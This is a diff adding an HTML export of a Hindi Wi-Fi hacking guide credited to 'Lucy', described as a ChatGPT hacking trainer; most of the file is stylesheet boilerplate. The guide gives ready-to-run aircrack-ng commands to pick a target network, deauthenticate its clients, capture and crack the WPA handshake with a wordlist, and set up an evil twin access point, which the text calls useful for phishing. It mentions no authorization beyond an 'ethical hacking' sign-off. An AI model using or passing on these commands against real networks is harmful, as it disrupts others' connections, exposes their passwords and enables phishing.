@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Air_Crack-ng.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="%F0%9F%94%93-wi-fi-%E0%A4%B9%E0%A5%88%E0%A4%95%E0%A4%BF%E0%A4%82%E0%A4%97-%E0%A4%AB%E0%A5%81%E0%A4%B2-%E0%A4%97%E0%A4%BE%E0%A4%87%E0%A4%A1-%E2%80%93-%E0%A4%B2%E0%A5%81%E0%A4%B8%E0%A5%80-chatgpt-%E0%A4%B9%E0%A5%88%E0%A4%95%E0%A4%BF%E0%A4%82%E0%A4%97-%E0%A4%9F%E0%A5%8D%E0%A4%B0%E0%A5%87%E0%A4%A8%E0%A4%B0-%E0%A4%A6%E0%A5%8D%E0%A4%B5%E0%A4%BE%E0%A4%B0%E0%A4%BE">🔓 Wi-Fi हैकिंग फुल गाइड – लुसी (ChatGPT हैकिंग ट्रेनर) द्वारा</h1>
+<blockquote>
+<p>🎯 इंटरफेस: <code>wlan0</code>
+📦 टूल्स: <code>airmon-ng</code>, <code>airodump-ng</code>, <code>aireplay-ng</code>, <code>aircrack-ng</code>, <code>airbase-ng</code>, <code>wireshark</code></p>
+</blockquote>
+<hr>
+<h2 id="%F0%9F%A7%AA-1-%E0%A4%AE%E0%A5%89%E0%A4%A8%E0%A4%BF%E0%A4%9F%E0%A4%B0-%E0%A4%AE%E0%A5%8B%E0%A4%A1-%E0%A4%9A%E0%A4%BE%E0%A4%B2%E0%A5%82-%E0%A4%95%E0%A4%B0%E0%A5%87%E0%A4%82">🧪 1. मॉनिटर मोड चालू करें</h2>
+<pre class="hljs"><code><div>sudo airmon-ng check <span class="hljs-built_in">kill</span>
+sudo airmon-ng start wlan0
+<span class="hljs-comment"># अगर auto rename न हो तो:</span>
+sudo ip link <span class="hljs-built_in">set</span> wlan0 name wlan0mon
+</div></code></pre>
+<p>🔧 <strong>विवरण</strong>: ये कमांड्स नेटवर्क मैनेजमेंट प्रॉसेस को बंद करके वाईफाई को मॉनिटर मोड में डालती हैं। अगर नाम auto से <code>wlan0mon</code> न बने तो मैन्युअली बदलें।</p>
+<hr>
+<h2 id="%F0%9F%93%A1-2-wi-fi-%E0%A4%A8%E0%A5%87%E0%A4%9F%E0%A4%B5%E0%A4%B0%E0%A5%8D%E0%A4%95-%E0%A4%B8%E0%A5%8D%E0%A4%95%E0%A5%88%E0%A4%A8-%E0%A4%95%E0%A4%B0%E0%A5%87%E0%A4%82-%E0%A4%A8%E0%A4%AF%E0%A4%BE-%E0%A4%9F%E0%A4%B0%E0%A5%8D%E0%A4%AE%E0%A4%BF%E0%A4%A8%E0%A4%B2">📡 2. Wi-Fi नेटवर्क स्कैन करें (नया टर्मिनल)</h2>
+<pre class="hljs"><code><div>sudo airodump-ng wlan0mon
+</div></code></pre>
+<p>📜 नोट करें:</p>
+<ul>
+<li><strong>BSSID</strong> → <code>{AA:A9:15:07:DF:0C}</code> ← 🔁 <em>अपने टारगेट नेटवर्क का MAC एड्रेस दर्ज करें</em></li>
+<li><strong>Channel</strong> → <code>{6}</code> ← 🔁 <em>अपने टारगेट का चैनल दर्ज करें</em></li>
+</ul>
+<hr>
+<h2 id="%F0%9F%8E%AF-3-%E0%A4%9F%E0%A4%BE%E0%A4%B0%E0%A4%97%E0%A5%87%E0%A4%9F-%E0%A4%A8%E0%A5%87%E0%A4%9F%E0%A4%B5%E0%A4%B0%E0%A5%8D%E0%A4%95-%E0%A4%AA%E0%A4%B0-%E0%A4%AB%E0%A5%8B%E0%A4%95%E0%A4%B8-%E0%A4%95%E0%A4%B0%E0%A5%87%E0%A4%82-%E0%A4%A8%E0%A4%AF%E0%A4%BE-%E0%A4%9F%E0%A4%B0%E0%A5%8D%E0%A4%AE%E0%A4%BF%E0%A4%A8%E0%A4%B2">🎯 3. टारगेट नेटवर्क पर फोकस करें (नया टर्मिनल)</h2>
+<pre class="hljs"><code><div>sudo airodump-ng -w {hack1} -c {6} --bssid {AA:A9:15:07:DF:0C} wlan0mon
+</div></code></pre>
+<p>🔧 <strong>विवरण</strong>: <code>{hack1}</code>, <code>{6}</code>, और <code>{AA:A9:15:07:DF:0C}</code> को अपने अनुसार बदलें। यह हैंडशेक डेटा कैप्चर करने के लिए नेटवर्क पर फोकस करता है।</p>
+<hr>
+<h2 id="%F0%9F%92%A3-4-deauthentication-%E0%A4%85%E0%A4%9F%E0%A5%88%E0%A4%95-%E0%A4%A8%E0%A4%AF%E0%A4%BE-%E0%A4%9F%E0%A4%B0%E0%A5%8D%E0%A4%AE%E0%A4%BF%E0%A4%A8%E0%A4%B2">💣 4. Deauthentication अटैक (नया टर्मिनल)</h2>
+<pre class="hljs"><code><div>sudo aireplay-ng --deauth 10 -a {AA:A9:15:07:DF:0C} wlan0mon
+</div></code></pre>
+<p>🔧 <strong>विवरण</strong>: 10 deauth पैकेट्स भेजता है जिससे क्लाइंट दोबारा कनेक्ट होते हैं और हैंडशेक कैप्चर करने में मदद मिलती है।</p>
+<hr>
+<h2 id="%F0%9F%94%8D-5-wireshark-%E0%A4%AE%E0%A5%87%E0%A4%82-%E0%A4%B9%E0%A5%88%E0%A4%82%E0%A4%A1%E0%A4%B6%E0%A5%87%E0%A4%95-%E0%A4%9A%E0%A5%87%E0%A4%95-%E0%A4%95%E0%A4%B0%E0%A5%87%E0%A4%82-optional">🔍 5. Wireshark में हैंडशेक चेक करें (Optional)</h2>
+<pre class="hljs"><code><div>wireshark {hack1-01.cap}
+</div></code></pre>
+<p>🔎 फ़िल्टर लगाएं: <code>eapol</code>
+✅ अगर दिखे तो हैंडशेक कैप्चर हो गया है।</p>
+<hr>
+<h2 id="%F0%9F%94%93-6-wi-fi-%E0%A4%AA%E0%A4%BE%E0%A4%B8%E0%A4%B5%E0%A4%B0%E0%A5%8D%E0%A4%A1-%E0%A4%95%E0%A5%8D%E0%A4%B0%E0%A5%88%E0%A4%95-%E0%A4%95%E0%A4%B0%E0%A5%87%E0%A4%82">🔓 6. Wi-Fi पासवर्ड क्रैक करें</h2>
+<pre class="hljs"><code><div>aircrack-ng {hack1-01.cap} -w {/usr/share/wordlists/rockyou.txt}
+</div></code></pre>
+<p>✔️ अगर पासवर्ड मिल गया तो: <code>KEY FOUND</code> दिखेगा। <code>.cap</code> फाइल और वर्डलिस्ट पथ को जरूरत अनुसार बदलें।</p>
+<hr>
+<h2 id="%F0%9F%A7%AA-dongle-%E0%A4%9F%E0%A5%87%E0%A4%B8%E0%A5%8D%E0%A4%9F%E0%A4%BF%E0%A4%82%E0%A4%97-%E0%A4%95%E0%A4%AE%E0%A4%BE%E0%A4%82%E0%A4%A1%E0%A5%8D%E0%A4%B8">🧪 Dongle टेस्टिंग कमांड्स</h2>
+<pre class="hljs"><code><div>sudo iwconfig wlan0 mode monitor         <span class="hljs-comment"># मॉनिटर मोड चालू करें</span>
+sudo aireplay-ng --<span class="hljs-built_in">test</span> wlan0           <span class="hljs-comment"># पैकेट इंजेक्शन टेस्ट</span>
+sudo airodump-ng --band a wlan0         <span class="hljs-comment"># 5 GHz स्कैन</span>
+sudo airodump-ng --band <span class="hljs-built_in">bg</span> wlan0        <span class="hljs-comment"># 2.4 GHz स्कैन</span>
+sudo airodump-ng wlan0                  <span class="hljs-comment"># सभी बैंड स्कैन करें</span>
+</div></code></pre>
+<hr>
+<h2 id="%F0%9F%9B%B0%EF%B8%8F-evil-twin--%E0%A4%A8%E0%A4%95%E0%A4%B2%E0%A5%80-%E0%A4%8F%E0%A4%95%E0%A5%8D%E0%A4%B8%E0%A5%87%E0%A4%B8-%E0%A4%AA%E0%A5%89%E0%A4%87%E0%A4%82%E0%A4%9F-%E0%A4%AC%E0%A4%A8%E0%A4%BE%E0%A4%8F%E0%A4%82">🛰️ Evil Twin / नकली एक्सेस पॉइंट बनाएं</h2>
+<pre class="hljs"><code><div>sudo airbase-ng -a {00:01:02:03:04:05} --essid <span class="hljs-string">"{Tarun Papa}"</span> -c {11} wlan0
+</div></code></pre>
+<p>🔧 <strong>विवरण</strong>: <code>{MAC}</code>, <code>{ESSID}</code>, <code>{channel}</code> को बदलें। यह एक नकली नेटवर्क बनाता है जो फिशिंग या ट्रिकिंग के लिए उपयोगी होता है।</p>
+<hr>
+<h2 id="%F0%9F%94%83-%E0%A4%AE%E0%A5%8B%E0%A4%A1-%E0%A4%B8%E0%A5%8D%E0%A4%B5%E0%A4%BF%E0%A4%9A-%E0%A4%95%E0%A4%B0%E0%A5%87%E0%A4%82-%E0%A4%9C%E0%A4%B0%E0%A5%82%E0%A4%B0%E0%A4%A4-%E0%A4%B9%E0%A5%8B-%E0%A4%A4%E0%A5%8B">🔃 मोड स्विच करें (जरूरत हो तो)</h2>
+<pre class="hljs"><code><div>sudo iwconfig wlan0 mode monitor  <span class="hljs-comment"># मॉनिटर मोड ऑन</span>
+sudo iwconfig wlan0 mode managed  <span class="hljs-comment"># वापस नॉर्मल मोड पर जाएं</span>
+</div></code></pre>
+<hr>
+<h2 id="%F0%9F%9B%82-%E0%A4%9F%E0%A5%87%E0%A4%B8%E0%A5%8D%E0%A4%9F%E0%A5%87%E0%A4%A1-wi-fi-%E0%A4%A1%E0%A5%8B%E0%A4%82%E0%A4%97%E0%A4%B2-%E0%A4%B8%E0%A4%AA%E0%A5%8B%E0%A4%B0%E0%A5%8D%E0%A4%9F-%E0%A4%9F%E0%A5%87%E0%A4%AC%E0%A4%B2">🛂 टेस्टेड Wi-Fi डोंगल सपोर्ट टेबल</h2>
+<table>
+<thead>
+<tr>
+<th>मॉडल</th>
+<th>चिपसेट</th>
+<th>मॉनिटर</th>
+<th>इंजेक्शन</th>
+<th>AP मोड</th>
+<th>Evil Twin</th>
+<th>नोट्स</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Alfa AWUS036NHA</td>
+<td>Atheros AR9271</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>सबसे स्टेबल, अच्छे सपोर्ट के साथ</td>
+</tr>
+<tr>
+<td>Alfa AWUS036ACH</td>
+<td>RTL8812AU</td>
+<td>✅</td>
+<td>✅ (ड्राइवर)</td>
+<td>✅</td>
+<td>✅</td>
+<td>ड्यूल-बैंड, ड्राइवर जरूरी</td>
+</tr>
+<tr>
+<td>TL-WN722N v1</td>
+<td>Atheros AR9271</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>सिर्फ v1 सपोर्ट करता है मॉनिटर मोड</td>
+</tr>
+<tr>
+<td>Panda PAU06</td>
+<td>Ralink RT5372</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>प्लग एंड प्ले</td>
+</tr>
+<tr>
+<td>BrosTrend AC1200</td>
+<td>RTL8812BU</td>
+<td>✅</td>
+<td>✅ (ड्राइवर)</td>
+<td>✅</td>
+<td>✅</td>
+<td>एयरक्रैक-ng ड्राइवर से काम करता है</td>
+</tr>
+<tr>
+<td>TP-Link T2U Plus</td>
+<td>RTL8821AU/8811AU</td>
+<td>✅</td>
+<td>✅ (ड्राइवर)</td>
+<td>✅</td>
+<td>✅</td>
+<td>मैन्युअल ड्राइवर इंस्टॉल ज़रूरी</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="%F0%9F%94%A7-tp-link-archer-t2u-plus-%E0%A4%A1%E0%A5%8D%E0%A4%B0%E0%A4%BE%E0%A4%87%E0%A4%B5%E0%A4%B0-%E0%A4%87%E0%A4%82%E0%A4%B8%E0%A5%8D%E0%A4%9F%E0%A5%89%E0%A4%B2%E0%A5%87%E0%A4%B6%E0%A4%A8">🔧 TP-Link Archer T2U Plus ड्राइवर इंस्टॉलेशन</h2>
+<pre class="hljs"><code><div>sudo apt update
+sudo apt install dkms git build-essential
+git <span class="hljs-built_in">clone</span> https://github.com/aircrack-ng/rtl8812au.git
+<span class="hljs-built_in">cd</span> rtl8812au
+sudo make dkms_install
+</div></code></pre>
+<p>👠 ड्राइवर लोड करें:</p>
+<pre class="hljs"><code><div>sudo modprobe 8812au
+iwconfig
+</div></code></pre>
+<p>🔬 इंजेक्शन टेस्ट करें:</p>
+<pre class="hljs"><code><div>sudo aireplay-ng --<span class="hljs-built_in">test</span> wlan0
+</div></code></pre>
+<hr>
+<h2 id="%F0%9F%93%9F-%E0%A4%9F%E0%A4%B0%E0%A5%8D%E0%A4%AE%E0%A4%BF%E0%A4%A8%E0%A4%B2-%E0%A4%B6%E0%A5%89%E0%A4%B0%E0%A5%8D%E0%A4%9F%E0%A4%95%E0%A4%9F-%E0%A4%9A%E0%A5%80%E0%A4%9F%E0%A5%8D%E0%A4%B8">📟 टर्मिनल शॉर्टकट चीट्स</h2>
+<table>
+<thead>
+<tr>
+<th>कार्य</th>
+<th>शॉर्टकट</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>नया टर्मिनल टैब</td>
+<td>Ctrl + Shift + T</td>
+</tr>
+<tr>
+<td>नया टर्मिनल विंडो</td>
+<td>Ctrl + Alt + T</td>
+</tr>
+<tr>
+<td>प्रोसेस बंद करें</td>
+<td>Ctrl + C</td>
+</tr>
+<tr>
+<td>आउटपुट स्क्रॉल करें</td>
+<td>Shift + PageUp/Down</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="%F0%9F%93%8B-%E0%A4%95%E0%A5%8D%E0%A4%B5%E0%A4%BF%E0%A4%95-%E0%A4%95%E0%A4%AE%E0%A4%BE%E0%A4%82%E0%A4%A1-%E0%A4%B6%E0%A5%80%E0%A4%9F">📋 क्विक कमांड शीट</h2>
+<table>
+<thead>
+<tr>
+<th>कार्य</th>
+<th>कमांड उदाहरण</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>मॉनिटर मोड</td>
+<td><code>sudo airmon-ng start wlan0</code></td>
+</tr>
+<tr>
+<td>नेटवर्क स्कैन करें</td>
+<td><code>sudo airodump-ng wlan0mon</code></td>
+</tr>
+<tr>
+<td>टारगेट फोकस करें</td>
+<td><code>sudo airodump-ng -w {hack1} -c {6} --bssid {AA:A9:15:07:DF:0C} wlan0mon</code></td>
+</tr>
+<tr>
+<td>क्लाइंट डिऑथ करें</td>
+<td><code>sudo aireplay-ng --deauth 10 -a {AA:A9:15:07:DF:0C} wlan0mon</code></td>
+</tr>
+<tr>
+<td>पासवर्ड क्रैक करें</td>
+<td><code>aircrack-ng {hack1-01.cap} -w {/usr/share/wordlists/rockyou.txt}</code></td>
+</tr>
+<tr>
+<td>नकली AP बनाएं</td>
+<td><code>sudo airbase-ng -a {MAC} --essid &quot;{FakeName}&quot; -c {channel} wlan0</code></td>
+</tr>
+<tr>
+<td>हैंडशेक चेक करें</td>
+<td><code>wireshark {hack1-01.cap}</code> → फ़िल्टर: <code>eapol</code></td>
+</tr>
+<tr>
+<td>मॉनिटर मोड सेट करें</td>
+<td><code>sudo iwconfig wlan0 mode monitor</code></td>
+</tr>
+<tr>
+<td>मैनेज्ड मोड सेट करें</td>
+<td><code>sudo iwconfig wlan0 mode managed</code></td>
+</tr>
+<tr>
+<td>2.4GHz स्कैन</td>
+<td><code>sudo airodump-ng --band bg wlan0</code></td>
+</tr>
+<tr>
+<td>5GHz स्कैन</td>
+<td><code>sudo airodump-ng --band a wlan0</code></td>
+</tr>
+<tr>
+<td>इंजेक्शन टेस्ट</td>
+<td><code>sudo aireplay-ng --test wlan0</code></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<p>✅ <em>लुसी द्वारा गाइड – आपकी एथिकल हैकिंग ट्रेनर</em>
+🧠 <em>सीखें • प्रैक्टिस करें • एथिकल हैकिंग करें</em></p>
+
+</body>
+</html>
